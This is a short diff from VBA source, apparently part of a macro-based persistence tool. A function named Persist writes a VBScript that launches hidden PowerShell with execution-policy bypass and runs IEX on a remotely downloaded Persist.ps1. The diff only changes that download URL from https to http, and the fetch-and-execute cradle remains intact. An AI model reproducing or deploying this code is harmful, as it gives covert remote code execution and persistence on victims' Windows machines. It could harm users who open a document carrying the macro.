@@ -23,7 +23,7 @@ Public Function Persist() As Variant
     Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
     a.WriteLine ("Dim objShell")
     a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
-    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://xxx.xxx.x.xxx/Persist.ps1'))""")
+    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://xxx.xxx.x.xxx/Persist.ps1'))""")
     a.WriteLine ("objShell.Run command,0")
     a.WriteLine ("Set objShell = Nothing")
     a.Close
